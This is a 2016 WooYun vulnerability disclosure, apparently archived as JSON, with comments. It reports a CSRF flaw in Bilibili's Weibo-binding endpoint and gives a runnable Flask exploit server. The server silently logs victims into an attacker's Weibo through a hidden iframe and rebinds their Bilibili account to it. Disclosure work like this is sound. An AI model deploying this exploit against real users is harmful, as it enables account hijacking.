{"id": 74290, "wybug_id": "wooyun-2016-0169000", "wybug_title": "点我的链接我就可能会进入你的B站账号", "wybug_corp": "bilibili.com", "wybug_author": "zhchbin", "wybug_date": "2016-01-11 10:26", "wybug_open_date": "2016-02-22 16:48", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["漏洞利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-22：\t细节向公众公开  简要描述： 感谢@呆子不开口！思路好赞的！我来写个详细点的利用过程。 详细说明：  在B站上，用户是允许绑定微博登陆的，然而绑定的接口是可以CSRF的，也就是说当用户登录后，点击我的链接，我就可以调用该接口完成绑定，绑定后就可以用我使用的微博进行登录了。具体接口如下：\nhttps://account.bilibili.com/login?sns=weibo\n问题的关键点在于此接口的CSRF，而另外一个难题就是如何在用户的浏览器上登录我的微博了。0x01 注册一个微博，然后用微博授权给bilibili。要先授权的原因是在伟哥的漏洞中已经提到过，这里引用并修改一下：“新浪微博的授权有如下特点，如果当前登陆的微博曾经授权过bilibili，那么就会自动绑定成功”0x02 用一个隐藏的iframe在用户的浏览器上登录我们指定的微博。这里使用到的接口有个问题需要注意，就是请求参数中password_4555和vk=4555_a3b5_1907935541，这两个参数是在http://login.weibo.cn/中生成的，有一定的时效性，后端会校验是否合法，因此我们需要动态生成登录的表单。我写了一个简单的flask接口，在服务端请求后提取出来生成表单，然后前端自动提交即可完成登录。\nPOST /login/ HTTP/1.1Host: login.weibo.cnContent-Type: application/x-www-form-urlencodedmobile=weibo_username&password_4555=weibo_password&remember=on&backURL=http%253A%252F%252Fweibo.cn%252F&backTitle=%E5%BE%AE%E5%8D%9A&tryCount=&vk=4555_a3b5_1907935541&submit=%E7%99%BB%E5%BD%95\n0x03 登录微博后前端就可以用Image加载指定的URL，完成绑定了。如果用户先绑定了微博，需要先解绑，然后再绑定，具体过程看漏洞证明中的代码。0x04 用户访问完以上的页面后，我们就可以利用上面的微博账号登录到用户的bilibili账号了。   漏洞证明：  我直接给出我写个一个flask程序，依赖flask和beautifulsoup，就不在我自己的主机上搭测试环境了。\n$ pip install flask beautifulsoup && python server.py\nserver.py，自己改一下weibo_username和weibo_password吧。\n# -*- coding: utf-8 -*-import requestsimport refrom flask import Flaskfrom BeautifulSoup import BeautifulSoupapp = Flask(__name__)login_weibo_form = u'''<form action=\"http://login.weibo.cn/login/\" method=\"post\"><input type=\"text\" name=\"mobile\" value=\"weibo_username\"/><input type=\"text\" name=\"%s\" value=\"weibo_password\"/><input type=\"text\" name=\"remember\" value=\"on\"/><input type=\"text\" name=\"backURL\" value=\"http://weibo.cn/\"/><input type=\"text\" name=\"backTitle\" value=\"微博\"/><input type=\"text\" name=\"tryCount\" value=\"\"/><input type=\"text\" name=\"vk\" value=\"%s\"/><input type=\"submit\" name=\"submit\" value=\"登录\" id=\"submit_btn\"/><script> document.getElementById('submit_btn').click(); </script></form>'''@app.route('/login_weibo', methods=['GET'])def login_weibo():    res = requests.get('http://login.weibo.cn/login/')    soup = BeautifulSoup(res.text)    password_name = soup.find('input', type='password')['name']    vk_value = soup.find('input', {'name': 'vk'})['value']    return login_weibo_form % (password_name, vk_value)csrf_bind_weibo = '''<iframe src=\"/login_weibo\" sandbox=\"allow-forms allow-scripts\"></iframe><script>function unbind() {  var img = new Image();  img.src = \"https://account.bilibili.com/site/unbind?sns=weibo\";}function bind() {  var img = new Image();  img.src = 'https://account.bilibili.com/login?sns=weibo';}setTimeout(function() {  unbind();  setTimeout(function() {    bind();  }, 1000);}, 2000);</script>'''@app.route('/', methods=['GET'])def steal_bilibili():    return csrf_bind_weiboif __name__ == '__main__':    app.run(host=\"0.0.0.0\", port=80, debug=True)\n运行后访问页面，你就会发现：\n\n\n\n   修复方案：  修复绑定接口的CSRF。   版权声明：转载请注明来源 zhchbin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2016-01-11 20:08 厂商回复： 谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-11 11:03 |    \t\tautO_pw \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:5        )\t\t \n  说好的链接呢    \n     2016-01-11 11:06 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:28        | 开发真是日了狗了)\t\t \n  啊♂乖乖站好！    \n     2016-01-11 12:02 |    \t\tvon \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 一个帅字贯穿了我的一生~)\t\t \n  看这个主题就感觉很厉害，手动滑稽    \n     2016-01-11 14:21 |    \t\tSH0X8001 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | 你猜)\t\t \n  说好的链接呢    \n     2016-01-11 20:25 |    \t\tzhchbin \t\t\t( 普通白帽子  |\t\t\t        Rank:113 漏洞数:24        | 要走得再远一些！|但行好事，不问前程)\t\t \n  @autO_pw @SH0X8001 发了会被打的。 @f4ckbaidu 叔叔，我们不约。 @von 然而rank都挺低，不过过程能学到不少。    \n     2016-01-12 00:59 |    \t\t呆子不开口 \t\t\t( 普通白帽子  |\t\t\t        Rank:370 漏洞数:34        | 求各种兼职)\t\t \n  @zhchbin 站短我用的哪一个    \n     2016-01-12 09:39 |    \t\tphantom0307 \t\t\t( 普通白帽子  |\t\t\t        Rank:131 漏洞数:39        | Night time sharpensHeightens each sens...)\t\t \n  洞主竟然连B站都不放过~~    \n     2016-02-01 12:46 |    \t\t川川 \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:30        | 今天我刷屏)\t\t \n  请用户安装了python后，下载server.py,然后运行server.py，然后再悄悄的点一下我的链接........你都让用户执行任意程序了，还来玩csrf？这就好比拿到了服务器权限，我非要执行一个反射xss，来证明危害    \n     2016-02-01 12:52 |    \t\tzhchbin \t\t\t( 普通白帽子  |\t\t\t        Rank:113 漏洞数:24        | 要走得再远一些！|但行好事，不问前程)\t\t \n  @川川 确定看懂了这个漏洞吗？    \n     2016-02-01 12:59 |    \t\tzhchbin \t\t\t( 普通白帽子  |\t\t\t        Rank:113 漏洞数:24        | 要走得再远一些！|但行好事，不问前程)\t\t \n  @川川 给出的python程序是攻击者的服务器，可能是我没写清楚导致误解了，我的错。一句话描述这个漏洞：用户访问了攻击者提供的链接后，攻击者的微博绑定到了用户的B站账号中。    \n     2016-02-01 14:16 |    \t\t川川 \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:30        | 今天我刷屏)\t\t \n  哦，我的错，理解错了    \n     2016-02-03 14:16 |    \t\tAdra1n \t\t\t( 普通白帽子  |\t\t\t        Rank:441 漏洞数:69        )\t\t \n  咋过的验证码？    \n     2016-02-03 14:44 |    \t\tzhchbin \t\t\t( 普通白帽子  |\t\t\t        Rank:113 漏洞数:24        | 要走得再远一些！|但行好事，不问前程)\t\t \n  @Adra1n 之前是没有验证码的，想必新浪微博的人也看到这个问题了。    \n     2016-02-03 14:45 |    \t\t呆子不开口 \t\t\t( 普通白帽子  |\t\t\t        Rank:370 漏洞数:34        | 求各种兼职)\t\t \n  @zhchbin 还有更简单的自动登陆新浪的方式，你这个有点粗暴了    \n     2016-02-03 15:11 |    \t\tzhchbin \t\t\t( 普通白帽子  |\t\t\t        Rank:113 漏洞数:24        | 要走得再远一些！|但行好事，不问前程)\t\t \n  @呆子不开口 玄机难道是藏在SSO验证的过程中？等有空去研究一下那个过程，还是有其他？    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}